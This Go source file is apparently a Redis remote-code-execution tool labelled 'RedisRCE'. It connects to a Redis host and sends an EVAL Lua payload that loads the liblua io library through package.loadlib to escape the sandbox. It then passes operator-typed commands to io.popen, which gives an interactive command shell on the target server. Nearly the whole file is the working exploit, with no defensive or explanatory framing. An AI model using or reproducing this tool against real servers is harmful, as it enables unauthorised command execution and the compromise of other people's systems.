package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"github.com/go-redis/redis/v8"
	"os"
	"strings"
	"time"
)

var msg string
var add string
var user string
var pwd string
var db int
var client *redis.Client
var coonStatus bool
var coonMsg int

func cmd(ctx context.Context, msg string) (string, error) {
	cmd := client.Eval(ctx, `local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("`+msg+`", "r"); local res = f:read("*a"); f:close(); return res`, []string{""})
	res, err := cmd.Text()
	if err != nil {
		return "", err
	}
	return res, nil
}

func main() {

	defer func() {
		if err := recover(); err != nil {
			fmt.Println("[INFO]:RedisRCE Non-existent")
		}
	}()

	flag.StringVar(&add, "h", "127.0.0.1:6379", "host default 127.0.0.1:6379")
	flag.StringVar(&user, "u", "", "no username set")
	flag.StringVar(&pwd, "p", "", "no password set")
	flag.IntVar(&db, "d", 0, "default DB")
	flag.Parse()

	view := `
 ____  ____  ____   ____  ___    ____   ___  ____ 
(  _ \( ___)(  _ \ (_  _)/ __)  (  _ \ / __)( ___)
 )   / )__)  )(_) ) _)(_ \__ \   )   /( (__  )__) 
(_)\_)(____)(____/ (____)(___/  (_)\_) \___)(____)  by:Z92G`
	fmt.Println(view)
	fmt.Println()

	for {
		client = redis.NewClient(&redis.Options{
			Addr:     add,
			Username: user,
			Password: pwd,
			DB:       db,
			PoolSize: 100,
		})

		if coonStatus == true {
			if coonMsg == 0 {
				fmt.Println("[INFO]:Connection Success")
				coonMsg = 1
			}
			input := bufio.NewReader(os.Stdin)
			fmt.Print("Console>")
			var err error
			msg, err = input.ReadString('\n')
			if err != nil {
				fmt.Println("input errÔºÅ", err)
				return
			}
		}

		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		pong, err := client.Ping(ctx).Result()
		if err != nil || pong != "PONG" {
			fmt.Println("[INFO]:Connection Fail")
			return
		}

		coonStatus = true

		msg = strings.TrimSpace(msg)

		if msg != "" && !strings.Contains(msg, "\\") {
			if strings.ToLower(msg) == "q" {
				os.Exit(1)
			}
			res, err := cmd(ctx, msg)
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Println(res)
		} else {
			_, err := cmd(ctx, "id")
			if err != nil {
				panic(err)
			}
		}
		cancel()
	}

}
